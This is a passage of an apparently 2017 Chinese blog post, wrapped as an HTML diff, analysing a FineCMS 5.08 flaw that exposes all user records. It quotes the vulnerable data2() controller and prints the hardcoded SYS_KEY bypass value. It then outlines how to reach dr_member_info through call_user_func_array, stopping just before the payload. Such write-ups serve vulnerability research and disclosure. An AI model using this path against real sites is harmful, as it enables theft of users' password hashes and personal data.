@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="PHP," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="漏洞简介Finecms 最新版5.08存在权限绕过漏洞，可查看任意用户的相关信息，包括用户名，邮箱，密码，盐值等重要信息。 漏洞分析问题主要出在finecms/dayrui/controllers/Api.php的data2()函数中，这个函数的功能是调用自定义的数据。 123456789101112131415161">
+<meta name="keywords" content="PHP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FineCMS 前台任意用户所有信息泄露">
+<meta property="og:url" content="https://badgsd.github.io/2017/06/23/FineCMS-前台任意用户所有信息泄露/index.html">
+<meta property="og:site_name" content="Badcode">
+<meta property="og:description" content="漏洞简介Finecms 最新版5.08存在权限绕过漏洞，可查看任意用户的相关信息，包括用户名，邮箱，密码，盐值等重要信息。 漏洞分析问题主要出在finecms/dayrui/controllers/Api.php的data2()函数中，这个函数的功能是调用自定义的数据。 1234567891011121314151617181920212223242526272829303132333435363">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://badgsd.github.io/2017/06/23/FineCMS-前台任意用户所有信息泄露/1.png">
+<meta property="og:image" content="https://badgsd.github.io/2017/06/23/FineCMS-前台任意用户所有信息泄露/2.png">
+<meta property="og:updated_time" content="2018-08-31T17:35:34.600Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="FineCMS 前台任意用户所有信息泄露">
+<meta name="twitter:description" content="漏洞简介Finecms 最新版5.08存在权限绕过漏洞，可查看任意用户的相关信息，包括用户名，邮箱，密码，盐值等重要信息。 漏洞分析问题主要出在finecms/dayrui/controllers/Api.php的data2()函数中，这个函数的功能是调用自定义的数据。 1234567891011121314151617181920212223242526272829303132333435363">
+<meta name="twitter:image" content="https://badgsd.github.io/2017/06/23/FineCMS-前台任意用户所有信息泄露/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://badgsd.github.io/2017/06/23/FineCMS-前台任意用户所有信息泄露/"/>
+
+
+
+
+
+  <title>FineCMS 前台任意用户所有信息泄露 | Badcode</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Badcode</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://badgsd.github.io/2017/06/23/FineCMS-前台任意用户所有信息泄露/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Badcode">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Badcode">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">FineCMS 前台任意用户所有信息泄露</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-23T01:31:20+08:00">
+                2017-06-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Finecms 最新版5.08存在权限绕过漏洞，可查看任意用户的相关信息，包括用户名，邮箱，密码，盐值等重要信息。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>问题主要出在<code>finecms/dayrui/controllers/Api.php</code>的<code>data2()</code>函数中，这个函数的功能是调用自定义的数据。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">data2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$data = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 安全码认证</span></span><br><span class="line">    $auth = <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'auth'</span>, <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> ($auth != md5(SYS_KEY)) &#123;</span><br><span class="line">        <span class="comment">// 授权认证码不正确</span></span><br><span class="line">        $data = <span class="keyword">array</span>(<span class="string">'msg'</span> =&gt; <span class="string">'授权认证码不正确'</span>, <span class="string">'code'</span> =&gt; <span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 解析数据</span></span><br><span class="line">        $cache = <span class="string">''</span>;</span><br><span class="line">        $param = <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'param'</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($param[<span class="string">'cache'</span>]) &amp;&amp; $param[<span class="string">'cache'</span>]) &#123;</span><br><span class="line">            $cache = md5(dr_array2string($param));</span><br><span class="line">            $data = <span class="keyword">$this</span>-&gt;get_cache_data($cache);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$data) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ($param == <span class="string">'login'</span>) &#123;</span><br><span class="line">                <span class="comment">// 登录认证</span></span><br><span class="line">                $code = <span class="keyword">$this</span>-&gt;member_model-&gt;login(</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'username'</span>),</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'password'</span>),</span><br><span class="line">                    <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> (is_array($code)) &#123;</span><br><span class="line">                    $data = <span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'msg'</span> =&gt; <span class="string">'ok'</span>,</span><br><span class="line">                        <span class="string">'code'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">                        <span class="string">'return'</span> =&gt; <span class="keyword">$this</span>-&gt;member_model-&gt;get_member($code[<span class="string">'uid'</span>])</span><br><span class="line">                    );</span><br><span class="line">                &#125; <span class="keyword">elseif</span> ($code == <span class="number">-1</span>) &#123;</span><br><span class="line">                    $data = <span class="keyword">array</span>(<span class="string">'msg'</span> =&gt; fc_lang(<span class="string">'会员不存在'</span>), <span class="string">'code'</span> =&gt; <span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> ($code == <span class="number">-2</span>) &#123;</span><br><span class="line">                    $data = <span class="keyword">array</span>(<span class="string">'msg'</span> =&gt; fc_lang(<span class="string">'密码不正确'</span>), <span class="string">'code'</span> =&gt; <span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> ($code == <span class="number">-3</span>) &#123;</span><br><span class="line">                    $data = <span class="keyword">array</span>(<span class="string">'msg'</span> =&gt; fc_lang(<span class="string">'Ucenter注册失败'</span>), <span class="string">'code'</span> =&gt; <span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> ($code == <span class="number">-4</span>) &#123;</span><br><span class="line">                    $data = <span class="keyword">array</span>(<span class="string">'msg'</span> =&gt; fc_lang(<span class="string">'Ucenter：会员名称不合法'</span>), <span class="string">'code'</span> =&gt; <span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ($param == <span class="string">'update_avatar'</span>) &#123;</span><br><span class="line">                <span class="comment">// 更新头像</span></span><br><span class="line">                $uid = (int)$_REQUEST[<span class="string">'uid'</span>];</span><br><span class="line">                $file = $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                <span class="comment">// 创建图片存储文件夹</span></span><br><span class="line">                $dir = SYS_UPLOAD_PATH.<span class="string">'/member/'</span>.$uid.<span class="string">'/'</span>;</span><br><span class="line">                @dr_dir_delete($dir);</span><br><span class="line">                <span class="keyword">if</span> (!is_dir($dir)) &#123;</span><br><span class="line">                    dr_mkdirs($dir);</span><br><span class="line">                &#125;</span><br><span class="line">                $file = str_replace(<span class="string">' '</span>, <span class="string">'+'</span>, $file);</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/^(data:\s*image\/(\w+);base64,)/'</span>, $file, $result))&#123;</span><br><span class="line">                    $new_file = $dir.<span class="string">'0x0.'</span>.$result[<span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">if</span> (!@file_put_contents($new_file, base64_decode(str_replace($result[<span class="number">1</span>], <span class="string">''</span>, $file)))) &#123;</span><br><span class="line">                        $data = <span class="keyword">array</span>(</span><br><span class="line">                            <span class="string">'msg'</span> =&gt; <span class="string">'目录权限不足或磁盘已满'</span>,</span><br><span class="line">                            <span class="string">'code'</span> =&gt; <span class="number">0</span></span><br><span class="line">                        );</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;load-&gt;library(<span class="string">'image_lib'</span>);</span><br><span class="line">                        $config[<span class="string">'create_thumb'</span>] = <span class="keyword">TRUE</span>;</span><br><span class="line">                        $config[<span class="string">'thumb_marker'</span>] = <span class="string">''</span>;</span><br><span class="line">                        $config[<span class="string">'maintain_ratio'</span>] = <span class="keyword">FALSE</span>;</span><br><span class="line">                        $config[<span class="string">'source_image'</span>] = $new_file;</span><br><span class="line">                        <span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="number">30</span>, <span class="number">45</span>, <span class="number">90</span>, <span class="number">180</span>) <span class="keyword">as</span> $a) &#123;</span><br><span class="line">                            $config[<span class="string">'width'</span>] = $config[<span class="string">'height'</span>] = $a;</span><br><span class="line">                            $config[<span class="string">'new_image'</span>] = $dir.$a.<span class="string">'x'</span>.$a.<span class="string">'.'</span>.$result[<span class="number">2</span>];</span><br><span class="line">                            <span class="keyword">$this</span>-&gt;image_lib-&gt;initialize($config);</span><br><span class="line">                            <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;image_lib-&gt;resize()) &#123;</span><br><span class="line">                                $data = <span class="keyword">array</span>(</span><br><span class="line">                                    <span class="string">'msg'</span> =&gt; <span class="keyword">$this</span>-&gt;image_lib-&gt;display_errors(),</span><br><span class="line">                                    <span class="string">'code'</span> =&gt; <span class="number">0</span></span><br><span class="line">                                );</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">list</span>($width, $height, $type, $attr) = getimagesize($dir.<span class="string">'45x45.'</span>.$result[<span class="number">2</span>]);</span><br><span class="line">                        <span class="keyword">if</span> (!$type) &#123;</span><br><span class="line">                            $data = <span class="keyword">array</span>(</span><br><span class="line">                                <span class="string">'msg'</span> =&gt; <span class="string">'错误的文件格式，请传输图片的字符'</span>,</span><br><span class="line">                                <span class="string">'code'</span> =&gt; <span class="number">0</span></span><br><span class="line">                            );</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $data = <span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'msg'</span> =&gt; <span class="string">'图片字符串不规范，请使用base64格式'</span>,</span><br><span class="line">                        <span class="string">'code'</span> =&gt; <span class="number">0</span></span><br><span class="line">                    );</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 更新头像</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'code'</span>]))&#123;</span><br><span class="line">                    $data = <span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'code'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">                        <span class="string">'msg'</span> =&gt; <span class="string">'更新成功'</span></span><br><span class="line">                    );</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;db-&gt;where(<span class="string">'uid'</span>, $uid)-&gt;update(<span class="string">'member'</span>, <span class="keyword">array</span>(<span class="string">'avatar'</span> =&gt; $uid));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ($param == <span class="string">'function'</span>) &#123;</span><br><span class="line">                <span class="comment">// 执行函数</span></span><br><span class="line">                $name = <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'name'</span>, <span class="keyword">true</span>);</span><br><span class="line">                <span class="keyword">if</span> (strpos($name, <span class="string">'dr_'</span>) !== <span class="number">0</span>) &#123;</span><br><span class="line">                    $data = <span class="keyword">array</span>(<span class="string">'msg'</span> =&gt; <span class="string">'函数名必须以dr_开头的自定义函数'</span>, <span class="string">'code'</span> =&gt; <span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (function_exists($name)) &#123;</span><br><span class="line">                    $_param = <span class="keyword">array</span>();</span><br><span class="line">                    $_getall = <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="keyword">null</span>, <span class="keyword">true</span>);</span><br><span class="line">                    <span class="keyword">if</span> ($_getall) &#123;</span><br><span class="line">                        <span class="keyword">for</span> ($i=<span class="number">1</span>; $i&lt;=<span class="number">10</span>; $i++) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (<span class="keyword">isset</span>($_getall[<span class="string">'p'</span>.$i])) &#123;</span><br><span class="line">                                $_param[] = $_getall[<span class="string">'p'</span>.$i];</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $data = <span class="keyword">array</span>(<span class="string">'msg'</span> =&gt; <span class="string">''</span>, <span class="string">'code'</span> =&gt; <span class="number">1</span>, <span class="string">'result'</span> =&gt; call_user_func_array($name, $_param));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $data = <span class="keyword">array</span>(<span class="string">'msg'</span> =&gt; <span class="string">'函数 （dr_'</span>.$name.<span class="string">'）不存在'</span>, <span class="string">'code'</span> =&gt; <span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ($param == <span class="string">'get_file'</span>) &#123;</span><br><span class="line">                <span class="comment">// 获取文件地址</span></span><br><span class="line">                $info = get_attachment((int)<span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'id'</span>));</span><br><span class="line">                <span class="keyword">if</span> (!$info) &#123;</span><br><span class="line">                    $data = <span class="keyword">array</span>(<span class="string">'msg'</span> =&gt; fc_lang(<span class="string">'附件不存在或者已经被删除'</span>), <span class="string">'code'</span> =&gt; <span class="number">0</span>, <span class="string">'url'</span> =&gt; <span class="string">''</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $data = <span class="keyword">array</span>(<span class="string">'msg'</span> =&gt; <span class="string">''</span>, <span class="string">'code'</span> =&gt; <span class="number">1</span>, <span class="string">'url'</span> =&gt; dr_get_file($info[<span class="string">'attachment'</span>]));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// list数据查询</span></span><br><span class="line">                $data = <span class="keyword">$this</span>-&gt;template-&gt;list_tag($param);</span><br><span class="line">                $data[<span class="string">'code'</span>] = $data[<span class="string">'error'</span>] ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">unset</span>($data[<span class="string">'sql'</span>], $data[<span class="string">'pages'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 缓存数据</span></span><br><span class="line">            $cache &amp;&amp; <span class="keyword">$this</span>-&gt;set_cache_data($cache, $data, $param[<span class="string">'cache'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 接收参数</span></span><br><span class="line">	$format = <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'format'</span>);</span><br><span class="line">	$function = <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'function'</span>);</span><br><span class="line">    <span class="keyword">if</span> ($function) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!function_exists($function)) &#123;</span><br><span class="line">            $data = <span class="keyword">array</span>(<span class="string">'msg'</span> =&gt; fc_lang(<span class="string">'自定义函数'</span>.$function.<span class="string">'不存在'</span>), <span class="string">'code'</span> =&gt; <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $data = $function($data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 页面输出</span></span><br><span class="line">	<span class="keyword">if</span> ($format == <span class="string">'php'</span>) &#123;</span><br><span class="line">		print_r($data);</span><br><span class="line">	&#125; <span class="keyword">elseif</span> ($format == <span class="string">'jsonp'</span>) &#123;</span><br><span class="line">		<span class="comment">// 自定义返回名称</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'callback'</span>, <span class="keyword">TRUE</span>).<span class="string">'('</span>.<span class="keyword">$this</span>-&gt;callback_json($data).<span class="string">')'</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// 自定义返回名称</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;callback_json($data);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先看下前面的安全码认证</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$auth = <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'auth'</span>, <span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">if</span> ($auth != md5(SYS_KEY))</span><br></pre></td></tr></table></figure>
+<p>看了一下，<code>SYS_KEY</code>是固定的，这就有意思了，说明这个安全认证我们是可以直接绕过的，<br><code>SYS_KEY</code>的值在<code>config/system.php</code>中定义了，是<code>24b16fede9a67c9251d3e7c7161c83ac</code>，这里我们简单的md5一次就可以绕过了。</p>
+<p>绕过了认证函数在往下看，下面是根据param的值来进行不同的操作，这里出现问题的地方是function这个点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">elseif</span> ($param == <span class="string">'function'</span>) &#123;</span><br><span class="line">                   <span class="comment">// 执行函数</span></span><br><span class="line">                   $name = <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'name'</span>, <span class="keyword">true</span>);</span><br><span class="line">                   <span class="keyword">if</span> (strpos($name, <span class="string">'dr_'</span>) !== <span class="number">0</span>) &#123;</span><br><span class="line">                       $data = <span class="keyword">array</span>(<span class="string">'msg'</span> =&gt; <span class="string">'函数名必须以dr_开头的自定义函数'</span>, <span class="string">'code'</span> =&gt; <span class="number">0</span>);</span><br><span class="line">                   &#125; <span class="keyword">elseif</span> (function_exists($name)) &#123;</span><br><span class="line">                       $_param = <span class="keyword">array</span>();</span><br><span class="line">                       $_getall = <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="keyword">null</span>, <span class="keyword">true</span>);</span><br><span class="line">                       <span class="keyword">if</span> ($_getall) &#123;</span><br><span class="line">                           <span class="keyword">for</span> ($i=<span class="number">1</span>; $i&lt;=<span class="number">10</span>; $i++) &#123;</span><br><span class="line">                               <span class="keyword">if</span> (<span class="keyword">isset</span>($_getall[<span class="string">'p'</span>.$i])) &#123;</span><br><span class="line">                                   $_param[] = $_getall[<span class="string">'p'</span>.$i];</span><br><span class="line">                               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                   <span class="keyword">break</span>;</span><br><span class="line">                               &#125;</span><br><span class="line">                           &#125;</span><br><span class="line">                       &#125;</span><br><span class="line">                       $data = <span class="keyword">array</span>(<span class="string">'msg'</span> =&gt; <span class="string">''</span>, <span class="string">'code'</span> =&gt; <span class="number">1</span>, <span class="string">'result'</span> =&gt; call_user_func_array($name, $_param));</span><br></pre></td></tr></table></figure>
+<p>可以看到这里调用了<code>call_user_func_array</code>这个方法，这个方法可以调用用户自定义的方法，最致命的是，<code>name</code>和<code>_param</code>的值是可控的。<code>name</code>的值就是我们要调用的函数名，这里finecms做了个限制，必须是以<code>dr_</code>开头的自定义函数才行，也就是这里造成了困扰，不然直接传个eval岂不是美滋滋。然后翻了一下一些函数，在<code>functon_helper.php</code>中有这么一个函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dr_member_info</span><span class="params">(uid, cache = <span class="number">-1</span>)</span> </span>&#123;</span><br><span class="line">$ci = &amp;get_instance();</span><br><span class="line">$data = $ci-&gt;get_cache_data(<span class="string">'member-info-'</span>.$uid);</span><br><span class="line"><span class="keyword">if</span> (!$data) &#123;</span><br><span class="line">    $data = $ci-&gt;member_model-&gt;get_member($uid);</span><br><span class="line">    $ci-&gt;set_cache_data(<span class="string">'member-info-'</span>.$uid, $data, $cache &gt; <span class="number">0</span> ? $cache : SYS_CACHE_MEMBER);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个函数会返回用户存在数据库中的所有信息。好了，函数有了，参数怎么传进来呢？</p>
+<p>上面的函数被判断通过之后，就开始获取参数了。<code>$_getall</code>是获取了所有的参数，但是下面还是进行了判断，要以<code>p</code>加数字这种形式的参数才可以传递进来，所以这里也是可以绕过的。好了，函数有了，参数有了，开始构造payload</p>
